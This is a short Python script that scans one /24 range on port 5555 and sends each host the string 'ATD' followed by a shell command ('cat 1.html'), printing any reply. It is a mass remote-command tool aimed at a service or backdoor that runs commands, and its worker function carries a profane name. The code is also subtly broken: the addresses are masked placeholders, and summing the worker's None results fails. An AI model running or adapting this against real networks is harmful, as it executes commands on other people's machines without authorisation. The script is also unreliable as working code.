from socket import *
from multiprocessing import Pool, freeze_support, cpu_count

port = 5555
ip = [f'*.*.*.{i}' for i in range(255)]
cmd = 'cat 1.html'


def Fuck(i):
    try:
        s = socket()
        s.connect((str(i), port))
        s.send(('ATD' + cmd).encode())
        print(s.recv(8192))
    except Exception as e:
        print(i, ' die')


if __name__ == '__main__':
    freeze_support()
    pool = Pool(cpu_count())
    results = pool.map(Fuck, ip)
    total_error = sum(results)
